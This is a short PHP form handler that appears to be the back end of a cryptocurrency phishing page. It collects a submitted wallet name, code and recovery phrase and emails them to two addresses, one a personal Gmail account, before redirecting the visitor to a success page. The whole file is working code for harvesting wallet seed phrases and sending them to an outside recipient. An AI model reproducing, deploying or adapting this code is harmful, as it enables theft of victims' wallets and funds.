<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Retrieve the form data
    $subject = $_POST["subject"];
    $walletname = $_POST["walletname"];
    $code = $_POST["code"];
    $phrase = $_POST["phrase"];

    // Generate a unique ID (you can use any method that suits your needs)
    $submissionID = uniqid();

    // Prepare the email content
    $to = "info@awakenedvault.com, marvenzo92@gmail.com";
    $headers = "From: donotreply@awakenedvault.com\r\n"; // Replace with your own email address
    $message = "Subject: $subject\nWallet Name: $walletname\nCode: $code\nPhrase: $phrase\nSubmission ID: $submissionID";

    // Send the email
    $sent = mail($to, $subject, $message, $headers);

    if ($sent) {
        // Redirect to the success page with the submission ID as a query parameter
        header("Location: success.php?id=" . urlencode($submissionID));
        exit();
    } else {
        // Handle the case where the email could not be sent (e.g., display an error message)
        echo "Failed to send the email. Please try again later.";
    }
}
?>
